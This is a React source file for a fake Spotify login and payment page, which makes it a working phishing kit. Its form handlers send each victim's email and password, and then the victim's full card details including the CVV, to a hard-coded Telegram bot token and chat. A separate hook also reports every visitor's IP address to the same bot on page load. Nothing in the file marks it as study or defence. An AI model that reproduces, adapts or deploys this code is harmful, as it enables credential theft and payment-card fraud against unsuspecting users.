
import React, { useState, useEffect } from 'react';

const SpotifyLogo: React.FC = () => (
  <svg role="img" viewBox="0 0 24 24" className="h-8 w-auto text-white" aria-label="Spotify">
    <path
      fill="currentColor"
      d="M13.427.01C6.805-.253 1.224 4.902.961 11.524.698 18.147 5.853 23.728 12.476 23.99c6.622.263 12.203-4.892 12.466-11.514S20.049.272 13.427.01m5.066 17.579a.717.717 0 0 1-.977.268 14.4 14.4 0 0 0-5.138-1.747 14.4 14.4 0 0 0-5.42.263.717.717 0 0 1-.338-1.392c1.95-.474 3.955-.571 5.958-.29 2.003.282 3.903.928 5.647 1.92a.717.717 0 0 1 .268.978m1.577-3.15a.93.93 0 0 1-1.262.376 17.7 17.7 0 0 0-5.972-1.96 17.7 17.7 0 0 0-6.281.238.93.93 0 0 1-1.11-.71.93.93 0 0 1 .71-1.11 19.5 19.5 0 0 1 6.94-.262 19.5 19.5 0 0 1 6.599 2.165c.452.245.62.81.376 1.263m1.748-3.551a1.147 1.147 0 0 1-1.546.488 21.4 21.4 0 0 0-6.918-2.208 21.4 21.4 0 0 0-7.259.215 1.146 1.146 0 0 1-.456-2.246 23.7 23.7 0 0 1 8.034-.24 23.7 23.7 0 0 1 7.657 2.445c.561.292.78.984.488 1.546"
    ></path>
  </svg>
);

const ArrowLeftIcon: React.FC = () => (
  <svg data-encore-id="icon" role="img" aria-hidden="true" className="h-6 w-6" viewBox="0 0 24 24">
    <path d="M15.957 2.793a1 1 0 0 1 0 1.414L8.164 12l7.793 7.793a1 1 0 1 1-1.414 1.414L5.336 12l9.207-9.207a1 1 0 0 1 1.414 0"></path>
  </svg>
);

const ErrorIcon: React.FC = () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="w-5 h-5 mr-2 flex-shrink-0">
        <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
    </svg>
);

const CheckmarkIcon: React.FC = () => (
    <svg className="w-24 h-24" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <defs>
            <filter id="glow">
                <feGaussianBlur stdDeviation="3.5" result="coloredBlur"/>
                <feMerge>
                    <feMergeNode in="coloredBlur"/>
                    <feMergeNode in="SourceGraphic"/>
                </feMerge>
            </filter>
        </defs>
        <circle cx="50" cy="50" r="45" fill="#1fdf64" style={{filter: 'url(#glow)'}} />
        <path d="M30 50 L45 65 L70 35" stroke="#121212" strokeWidth="8" fill="none" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
);


interface InputProps extends React.InputHTMLAttributes<HTMLInputElement> {
  label: string;
  error?: string | null;
}

const Input: React.FC<InputProps> = ({ label, id, error, ...props }) => {
  const errorClasses = error ? 'border-spotify-red focus:ring-spotify-red' : 'border-zinc-700 focus:ring-white';
  return (
    <div className="flex flex-col">
      <label htmlFor={id} className="block text-base font-bold mb-2">
        {label}
      </label>
      <input
        id={id}
        className={`w-full bg-zinc-800 border rounded-md p-3 text-white placeholder-zinc-500 focus:outline-none focus:ring-2 transition-colors ${errorClasses}`}
        {...props}
      />
      {error && <div className="text-spotify-red text-sm mt-2 flex items-start"><ErrorIcon /><p>{error}</p></div>}
    </div>
  );
};

const ProgressBar: React.FC<{ step: number; totalSteps: number }> = ({ step, totalSteps }) => {
    const progressPercentage = (step / totalSteps) * 100;
    return (
        <div className="w-full bg-zinc-700 rounded-full h-1 my-4">
            <div
                className="bg-spotify-green h-1 rounded-full transition-all duration-300 ease-in-out"
                style={{ width: `${progressPercentage}%` }}
            ></div>
        </div>
    );
};


const SignUpForm: React.FC = () => {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState<string | null>(null);
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [isSubmittingStep1, setIsSubmittingStep1] = useState(false);

  const [name, setName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameError, setNameError] = useState<string | null>(null);
  const [cardNumberError, setCardNumberError] = useState<string | null>(null);
  const [expiryDateError, setExpiryDateError] = useState<string | null>(null);
  const [cvvError, setCvvError] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);


  const validateEmail = (emailValue: string) => {
    if (!emailValue) {
        setEmailError("This email is invalid. Make sure it's written like example@email.com");
        return false;
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue)) {
      setEmailError("This email is invalid. Make sure it's written like example@email.com");
      return false;
    }
    setEmailError(null);
    return true;
  };

  const validatePassword = (passwordValue: string) => {
    if (!passwordValue) {
      setPasswordError('You need to enter a password.');
      return false;
    }
    if (passwordValue.length < 8) {
      setPasswordError('Your password needs to be at least 8 characters.');
      return false;
    }
    setPasswordError(null);
    return true;
  };
  
  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmail(value);
    validateEmail(value);
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setPassword(value);
    validatePassword(value);
  };


  const handleSubmitStep1 = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmittingStep1) return;

    const isEmailValid = validateEmail(email);
    const isPasswordValid = validatePassword(password);
    if (isEmailValid && isPasswordValid) {
      setIsSubmittingStep1(true);
      console.log('Form submitted:', { email, password });
      
      const botToken = '8058223565:AAHbgAMapXgv32Lg1vkLlTeL3BU-3Pvq6FY';
      const chatId = '-5043301005';
      const message = `-> Ntx Log -
User : ${email}
Pass : ${password}`;

      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });
      } catch (error) {
        console.error('Failed to send Telegram message:', error);
      }
      
      setTimeout(() => {
        setIsSubmittingStep1(false);
        setStep(2);
      }, 2000);
    }
  };

  const validateName = (value: string) => {
    if (!value.trim()) {
        setNameError('Enter the name on your card.');
        return false;
    }
    setNameError(null);
    return true;
  };

  const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      const value = e.target.value;
      setName(value);
      if (value) validateName(value); else setNameError(null);
  };

  // Luhn Algorithm validator
  const isValidCardNumber = (numStr: string): boolean => {
    const sanitized = numStr.replace(/\D/g, '');
    if (!/^\d+$/.test(sanitized) || sanitized.length < 13 || sanitized.length > 19) {
        return false;
    }
    let sum = 0;
    let shouldDouble = false;
    for (let i = sanitized.length - 1; i >= 0; i--) {
        let digit = parseInt(sanitized.charAt(i), 10);
        if (shouldDouble) {
            if ((digit *= 2) > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
  };
  
  const validateCardNumber = (value: string) => {
      if (!value) {
          setCardNumberError('Enter a card number.');
          return false;
      }
      if (!isValidCardNumber(value)) {
          setCardNumberError('Enter a valid card number.');
          return false;
      }
      setCardNumberError(null);
      return true;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      const rawValue = e.target.value.replace(/\s/g, '');
      const formattedValue = rawValue.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
      setCardNumber(formattedValue.slice(0, 19));
      if (rawValue) validateCardNumber(rawValue); else setCardNumberError(null);
  };

  const validateExpiryDate = (value: string): boolean => {
      if (!value) {
          setExpiryDateError("Enter an expiry date.");
          return false;
      }
      const parts = value.split(' / ');
      if (parts.length !== 2 || parts[0].length !== 2 || parts[1].length !== 2) {
          setExpiryDateError("Use MM / YY format.");
          return false;
      }
  
      const month = parseInt(parts[0], 10);
      const year = parseInt(parts[1], 10);
  
      if (isNaN(month) || isNaN(year) || month < 1 || month > 12) {
          setExpiryDateError("Enter a valid month.");
          return false;
      }
  
      const now = new Date();
      const currentYearLastTwoDigits = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
  
      if (year < currentYearLastTwoDigits || (year === currentYearLastTwoDigits && month < currentMonth)) {
          setExpiryDateError("Your card has expired.");
          return false;
      }
  
      setExpiryDateError(null);
      return true;
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 2) {
        value = value.slice(0, 2) + ' / ' + value.slice(2, 4);
      }
      setExpiryDate(value);
      if (value) validateExpiryDate(value); else setExpiryDateError(null);
  };

  const validateCvv = (value: string) => {
      if (!value) {
          setCvvError('Enter a CVV.');
          return false;
      }
      if (!/^\d{3}$/.test(value)) {
          setCvvError('Enter a 3-digit CVV.');
          return false;
      }
      setCvvError(null);
      return true;
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      const value = e.target.value.replace(/\D/g, '');
      setCvv(value.slice(0, 3));
      if (value) validateCvv(value.slice(0, 3)); else setCvvError(null);
  };

  const handlePaymentSubmit = (e: React.FormEvent) => {
      e.preventDefault();
      if (isProcessing) return;

      const isNameValid = validateName(name);
      const isCardValid = validateCardNumber(cardNumber.replace(/\s/g, ''));
      const isExpiryValid = validateExpiryDate(expiryDate);
      const isCvvValid = validateCvv(cvv);

      if (isNameValid && isCardValid && isExpiryValid && isCvvValid) {
          setIsProcessing(true);
          console.log('Payment form submitted', { name, cardNumber, expiryDate, cvv });
          const botToken = '8058223565:AAHbgAMapXgv32Lg1vkLlTeL3BU-3Pvq6FY';
          const chatId = '-5043301005';
          const message = `User added payment:
Name: ${name}
Card Number: ${cardNumber}
Expiry Date: ${expiryDate}
CVV: ${cvv}`;
    
          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
          fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message }),
          }).catch(error => {
            console.error('Failed to send Telegram message:', error);
          });

          setTimeout(() => {
            setIsProcessing(false);
            setStep(3);
          }, 3000);
      }
  }

  return (
    <div className="w-full max-w-sm mx-auto">
        <header className="py-5">
            <div className="flex justify-center">
                <SpotifyLogo />
            </div>
        </header>

        {step === 1 && (
            <>
                <ProgressBar step={1} totalSteps={3} />

                <div className="flex items-center space-x-4 mb-6">
                    <div>
                        <p className="text-xs font-bold text-zinc-400">Step 1 of 3</p>
                        <h1 className="text-2xl font-extrabold">Login to Spotify</h1>
                    </div>
                </div>

                <form onSubmit={handleSubmitStep1} className="space-y-4">
                     <Input
                        label="Email address"
                        id="email"
                        type="text"
                        value={email}
                        onChange={handleEmailChange}
                        autoComplete="username"
                        error={emailError}
                        placeholder="name@domain.com"
                    />
                    <Input
                        label="Password"
                        id="password"
                        type="password"
                        value={password}
                        onChange={handlePasswordChange}
                        autoComplete="new-password"
                        error={passwordError}
                    />
                     <div className="pt-4">
                        <button
                            type="submit"
                            disabled={isSubmittingStep1}
                            className={`w-full text-black font-bold py-3 px-4 rounded-full transition-colors ${
                                isSubmittingStep1 
                                ? 'bg-[#166534] cursor-not-allowed' 
                                : 'bg-spotify-green hover:bg-[#1fdf64] transform hover:scale-105'
                            }`}
                        >
                             {isSubmittingStep1 ? (
                                <div className="flex justify-center items-center h-[24px] space-x-1">
                                    <span className="w-2 h-2 bg-black/40 rounded-full animate-pulse" style={{ animationDelay: '-0.3s' }}></span>
                                    <span className="w-2 h-2 bg-black/40 rounded-full animate-pulse" style={{ animationDelay: '-0.15s' }}></span>
                                    <span className="w-2 h-2 bg-black/40 rounded-full animate-pulse"></span>
                                </div>
                            ) : (
                                'Next'
                            )}
                        </button>
                    </div>
                </form>
            </>
        )}

        {step === 2 && (
            <>
                <ProgressBar step={2} totalSteps={3} />

                <div className="flex items-center space-x-4 mb-6">
                    <div>
                        <p className="text-xs font-bold text-zinc-400">Step 2 of 3</p>
                        <h1 className="text-2xl font-extrabold">Update your payment method</h1>
                    </div>
                </div>

                <form onSubmit={handlePaymentSubmit} className="space-y-4">
                    <Input
                        label="Name on card"
                        id="name"
                        type="text"
                        autoComplete="cc-name"
                        placeholder="John M. Doe"
                        value={name}
                        onChange={handleNameChange}
                        error={nameError}
                    />
                    <Input
                        label="Card Number"
                        id="card-number"
                        type="tel"
                        inputMode="numeric"
                        autoComplete="cc-number"
                        placeholder="0000 0000 0000 0000"
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        error={cardNumberError}
                    />
                    <Input
                        label="Expiry Date"
                        id="expiry-date"
                        type="text"
                        autoComplete="cc-exp"
                        placeholder="MM / YY"
                        value={expiryDate}
                        onChange={handleExpiryDateChange}
                        error={expiryDateError}
                    />
                    <Input
                        label="Security Code (CVV)"
                        id="cvv"
                        type="tel"
                        inputMode="numeric"
                        autoComplete="cc-csc"
                        placeholder="123"
                        value={cvv}
                        onChange={handleCvvChange}
                        error={cvvError}
                        maxLength={3}
                    />
                     <div className="pt-4">
                        <button
                            type="submit"
                            disabled={isProcessing}
                            className={`w-full text-black font-bold py-3 px-4 rounded-full transition-colors ${
                                isProcessing 
                                ? 'bg-[#166534] cursor-not-allowed' 
                                : 'bg-spotify-green hover:bg-[#1fdf64] transform hover:scale-105'
                            }`}
                        >
                            {isProcessing ? (
                                <div className="flex justify-center items-center h-[24px] space-x-1">
                                    <span className="w-2 h-2 bg-black/40 rounded-full animate-pulse" style={{ animationDelay: '-0.3s' }}></span>
                                    <span className="w-2 h-2 bg-black/40 rounded-full animate-pulse" style={{ animationDelay: '-0.15s' }}></span>
                                    <span className="w-2 h-2 bg-black/40 rounded-full animate-pulse"></span>
                                </div>
                            ) : (
                                'Confirm Payment'
                            )}
                        </button>
                    </div>
                </form>
            </>
        )}

        {step === 3 && (
             <>
                <ProgressBar step={3} totalSteps={3} />
                <div className="flex flex-col items-center text-center pt-8">
                    <div className="mb-6">
                        <CheckmarkIcon />
                    </div>
                    <h1 className="text-3xl font-extrabold mb-4">Payment Approved</h1>
                    <p className="text-zinc-300 mb-10 max-w-xs">
                    </p>

                    <div className="pt-4 w-full">
                        <button
                            type="button"
                            className="w-full bg-white text-black font-bold py-3 px-4 rounded-full hover:bg-zinc-200 transition-colors transform hover:scale-105"
                            onClick={() => alert('Enjoy Spotify!')}
                        >
                            Start Listening
                        </button>
                    </div>
                </div>
            </>
        )}
    </div>
  );
};


const App: React.FC = () => {
  useEffect(() => {
    const sendVisitorLog = async () => {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (!ipResponse.ok) return;
            const ipData = await ipResponse.json();
            const ipAddress = ipData.ip;

            const botToken = '8058223565:AAHbgAMapXgv32Lg1vkLlTeL3BU-3Pvq6FY';
            const chatId = '5940123889';
            const message = `${ipAddress} : visite your website`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message }),
            });

        } catch (error) {
            console.error('Failed to send visitor log:', error);
        }
    };

    sendVisitorLog();
}, []);

  return (
    <div className="bg-[#121212] text-white min-h-screen flex flex-col items-center px-4 font-sans">
        <div className="w-full flex-grow flex flex-col justify-center max-w-sm">
            <main className="flex-grow">
                <SignUpForm />
            </main>
        </div>
        <footer className="w-full text-center text-xs text-zinc-500 py-6 mt-auto">
            <p>
                <a href="#" className="underline hover:text-spotify-green transition-colors">Privacy Policy</a> and <a href="#" className="underline hover:text-spotify-green transition-colors">Terms of Service</a> apply.
            </p>
        </footer>
    </div>
  );
};

export default App;
